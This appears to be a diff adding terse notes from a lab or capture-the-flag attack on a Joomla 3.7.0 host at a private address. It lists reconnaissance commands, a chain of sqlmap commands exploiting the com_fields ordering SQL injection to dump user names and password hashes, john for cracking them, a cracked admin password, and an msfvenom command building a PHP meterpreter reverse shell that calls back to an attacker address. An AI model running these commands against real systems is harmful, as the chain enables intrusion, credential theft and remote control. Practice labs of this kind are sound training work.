@@ -1,0 +1,10 @@
+<p>nmap -sV  192.168.101.13</p>
+<p>whatweb <a href="http://192.168.101.13/">http://192.168.101.13/</a></p>
+<p> searchsploit joomla 3.7.0</p>
+<p>sqlmap -u “<a href="http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent –dbs -p list[fullordering]</p>
+<p> sqlmap -u “<a href="http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent -D joomladb –tables  -p list[fullordering]</p>
+<p>  sqlmap -u “<a href="http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent -D joomladb -T #__users –columns  -p list[fullordering]</p>
+<p>   sqlmap -u “<a href="http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent -D joomladb -T “#__users” -C name,password –dump -p list[fullordering]</p>
+<p>   john mima.txt</p>
+<p>   admin snoopy   </p>
+<p>   msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.101.130  lport=4444</p>
